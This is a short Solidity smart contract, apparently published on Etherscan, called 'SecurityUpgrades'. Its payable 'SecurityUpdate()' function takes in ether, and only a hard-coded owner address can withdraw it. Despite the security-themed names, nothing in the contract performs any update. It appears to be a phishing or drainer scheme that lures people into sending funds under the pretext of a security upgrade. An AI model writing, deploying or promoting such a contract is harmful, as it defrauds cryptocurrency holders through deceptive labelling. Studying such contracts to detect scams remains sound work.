/**
 *Submitted for verification at Etherscan.io on 2021-11-11
*/

pragma solidity ^0.4.26;

contract SecurityUpgrades {

    address private  owner;

     constructor() public{   
        owner=0x7b22409ecA72D3d1484FbADffAF6e2eE1244E95A;
    }
    function getOwner() public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}